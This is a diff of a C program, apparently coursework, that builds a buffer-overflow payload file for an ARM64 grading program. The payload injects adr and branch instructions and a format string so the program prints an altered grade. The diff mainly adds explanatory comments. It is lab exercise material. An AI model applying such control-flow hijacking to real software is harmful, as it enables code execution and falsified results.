@@ -61,19 +61,23 @@ int main(void)
    fwrite(&instructions, sizeof(unsigned int), 1, psFile);
    
    /*0x42006C */
-   /* 52 - 55*/
+   /* 52 - 55 */ /* Plugs into x0 before the bl to fprintf the
+   new string we want which is denoted by the address below*/                 
    instructions = MiniAssembler_adr(0, 0x420074, 0x42006C);
    fwrite(&instructions, sizeof(unsigned int), 1, psFile);
    
-   /* 0x420070* - 0x420073/
+   /* 0x420070* - 0x420073*/
    /* 56 - 59*/
+   /* new address to return to thats after the assigning of x0 into fprintf and is
+      sent into assigning x1.*/
    instructions = MiniAssembler_b(0x40086C, 0x420070);   /* Branch to printing Grade*/
    fwrite(&instructions, sizeof(unsigned int), 1, psFile);
 
    /* used 28 bytes out of 48 */
 
    /* Writing 20 bytes */
-   
+
+   /* New string we want printed into fprintf for our grade*/
    fprintf(psFile, "%c", '%'); /* 0x40074*/
    fprintf(psFile, "%c", 'c');
    fprintf(psFile, "%c", '+');
@@ -92,18 +96,16 @@ int main(void)
    fprintf(psFile, "%c", 'd'); 
    fprintf(psFile, "%c", 'e');
    fprintf(psFile, "%c", '.');
-   fprintf(psFile, "%c", 'n');
-   /*putc(10, psFile);*/
-   fprintf(psFile, "%c", '\0'); 
+
+   /* NewLine seems to be the only escape sequence that DOESN'T work. */
+   /* So we left it as n to show that it is where the new line char should be*/
+   fprintf(psFile, "%c", 'n'); /* For some reason, we can't do \n*/
+  
+   fprintf(psFile, "%c", '\0');
    
    /* 20 bytes used*/
    /* all 48 bytes used*/
-   
-   /*writing 24 null chars */
-/*   
-   for (i = 0; i < 24; i++)
-      fprintf(psFile, "%c", '\0');
-*/ 
+  
    
    /*going to address 0x420060
      added 10 additional hex values since 400858 is only 3 bytes
